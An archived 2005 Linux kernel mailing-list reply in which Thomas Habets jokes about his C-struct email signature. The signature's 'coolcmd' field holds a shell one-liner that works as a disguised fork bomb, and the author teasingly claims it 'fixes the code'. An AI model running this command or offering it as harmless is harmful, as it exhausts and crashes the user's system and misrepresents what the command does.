Return-Path: <linux-kernel-owner+willy=40w.ods.org-S932520AbVHJJ17@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S932520AbVHJJ17 (ORCPT <rfc822;willy@w.ods.org>);
	Wed, 10 Aug 2005 05:27:59 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S932526AbVHJJ17
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Wed, 10 Aug 2005 05:27:59 -0400
Received: from [193.151.93.131] ([193.151.93.131]:3347 "EHLO
	reptilian.maxnet.nu") by vger.kernel.org with ESMTP id S932520AbVHJJ17
	(ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Wed, 10 Aug 2005 05:27:59 -0400
From: Thomas Habets <thomas@habets.pp.se>
To: Denis Vlasenko <vda@ilport.com.ua>
Subject: Re: [PATCH] Kernels Out Of Memoy(OOM) killer Problem ?
Date: Wed, 10 Aug 2005 10:31:14 +0200
User-Agent: KMail/1.7.2
Cc: linux-kernel@vger.kernel.org
References: <42F8720D.4060300@picsearch.com> <200508091133.21837.thomas@habets.pp.se> <200508101113.23490.vda@ilport.com.ua>
In-Reply-To: <200508101113.23490.vda@ilport.com.ua>
MIME-Version: 1.0
Content-Type: text/plain;
  charset="koi8-r"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline
Message-Id: <200508101031.14964.thomas@habets.pp.se>
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

Once upon a midnight dreary, Denis Vlasenko pondered, weak and weary:
> Your sig is very very buggy (if interpreted as C code).

*You're* buggy! [1]

The command in the sig fixes the code.

---------
typedef struct me_s {
  char name[]      = { "Thomas Habets" };
  char email[]     = { "thomas@habets.pp.se" };
  char kernel[]    = { "Linux" };
  char *pgpKey[]   = { "http://www.habets.pp.se/pubkey.txt" };
  char pgp[] = { "A8A3 D1DD 4AE0 8467 7FDE  0945 286A E90A AD48 E854" };
  char coolcmd[]   = { "echo '. ./_&. ./_'>_;. ./_" };
} me_t;

[1]    :-)
